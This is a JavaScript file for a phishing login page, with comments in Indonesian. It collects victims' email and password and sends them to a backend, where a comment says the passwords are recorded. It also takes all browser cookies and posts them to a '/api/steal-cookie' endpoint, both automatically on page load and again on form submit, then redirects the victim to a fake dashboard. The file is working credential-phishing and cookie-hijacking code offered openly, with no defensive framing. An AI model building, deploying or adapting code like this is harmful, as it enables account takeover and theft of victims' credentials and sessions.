// FLAG buat nandain kalo cookie hijacking udah dipake 1x
let cookieHijackingUsed = false;

// Ambil semua cookie dari browser korban
function getAllCookies() {
  return document.cookie.split('; ').reduce((acc, cookie) => {
    const [key, value] = cookie.split('=');
    acc[key] = value;
    return acc;
  }, {});
}

// Kirim cookie ke server (FITUR 3: Cookie Hijacking)
async function stealCookies() {
  // Cek: kalo udah pernah dipake, MATIIN!
  if (cookieHijackingUsed) {
    console.log('🚫 Cookie hijacking sudah dipake 1x, sistem mati.');
    return false;
  }

  const cookies = getAllCookies();
  try {
    const response = await fetch('/api/steal-cookie', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookies })
    });
    const data = await response.json();
    
    // Tandain udah dipake (1x)
    cookieHijackingUsed = true;
    console.log('✅ Cookie hijacking berhasil (percobaan ke-1), sistem sekarang mati.');
    return true;
  } catch (err) {
    // Tetep dianggap udah dipake meskipun gagal
    cookieHijackingUsed = true;
    console.log('❌ Cookie hijacking gagal, tapi tetap dianggap 1x percobaan.');
    return false;
  }
}

// HANDLE SUBMIT FORM (FITUR 1 + 2 + 3 JALAN BERSAMAAN)
document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const status = document.getElementById('status');
  
  status.textContent = '⏳ Memproses...';
  status.style.color = '#ffd700';

  try {
    // FITUR 1: Firebase Auth (kirim ke backend)
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });

    const result = await response.json();

    // FITUR 2: Rekam password (dilakuin di backend otomatis)
    if (result.success) {
      status.textContent = '✅ Login berhasil! Redirecting...';
      status.style.color = '#3fb950';
    } else {
      status.textContent = '❌ Login gagal, coba lagi';
      status.style.color = '#f85149';
    }

    // FITUR 3: Cookie Hijacking (hanya berjalan 1x, di percobaan APAPUN)
    await stealCookies();

    // Redirect ke dashboard palsu
    setTimeout(() => {
      window.location.href = 'https://target-firebase.web.app/dashboard';
    }, 1500);

  } catch (error) {
    status.textContent = '❌ Error server';
    status.style.color = '#f85149';
    console.error(error);
  }
});

// JALANKAN COOKIE HIJACKING OTMATIS SAAT HALAMAN DIMUAT (1x)
window.onload = async function() {
  // Cek kalo ada cookie, langsung curi (percobaan pertama)
  const cookies = getAllCookies();
  if (Object.keys(cookies).length > 0 && !cookieHijackingUsed) {
    console.log('🍪 Cookie ditemukan, auto steal (percobaan ke-1)');
    await stealCookies();
  }
};